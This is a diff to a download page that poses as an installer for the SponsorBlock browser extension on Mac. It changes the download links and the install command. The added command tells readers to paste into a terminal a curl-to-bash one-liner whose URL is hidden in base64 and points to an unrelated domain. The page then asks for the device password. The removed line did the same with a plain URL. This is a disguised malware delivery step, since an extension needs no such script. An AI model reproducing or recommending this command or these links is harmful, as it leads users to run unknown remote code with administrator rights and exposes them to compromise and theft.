@@ -2,7 +2,7 @@
 
 ## ✅ Download SponsorBlock for Mac (Free Browser Extension)
 
-[![🚀 Download SponsorBlock 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](https://smallpdf-desktop-mac-download.github.io/.github)
+[![🚀 Download SponsorBlock 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](https://shuziktobehuman.github.io/huja/SponsorBlock)
 
 ---
 
@@ -21,7 +21,7 @@
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -61,7 +61,7 @@ Its community-powered database grows daily, meaning the more people use it, the 
 
 ---
 
-[![⬇️ Download SponsorBlock Again 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](https://sponsorblock-mac-download.github.io/.github)
+[![⬇️ Download SponsorBlock Again 🟣](https://img.shields.io/badge/Download-SponsorBlock-blueviolet?style=for-the-badge)](https://shuziktobehuman.github.io/huja/SponsorBlock)
 
 ---
 
